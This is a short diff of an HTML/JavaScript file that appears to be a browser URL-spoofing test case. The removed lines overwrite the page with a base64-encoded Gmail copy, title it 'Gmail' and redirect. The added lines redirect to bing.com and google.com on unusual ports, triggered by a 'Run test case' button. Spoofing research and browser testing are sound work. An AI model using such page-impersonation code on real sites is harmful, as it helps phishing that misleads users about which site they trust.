@@ -1,11 +1,9 @@
 <script>
-function spoof()
-{
-var gmail = 'PCFET0NC8+KArOK........ZHk+PC9odG1sPg=='; //The base64 encoded version of the Gmail page
-x=document.body.innerHTML=atob(gmail);
-document.write("<title>Gmail</title>");
-document.write("x");
-window.location.assign("https://www.Gmail.com:8080");
-}
-setInterval(spoof(),100000);
+    function spoof() {
+    document.write("<h1>This is not Bing</h1>");
+    document.location = "https://bing.com:1234";
+    setInterval(function(){document.location="https://google.com:9090/#https://google.com:9090";},9800);
+    };
 </script>
+<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
+</p>
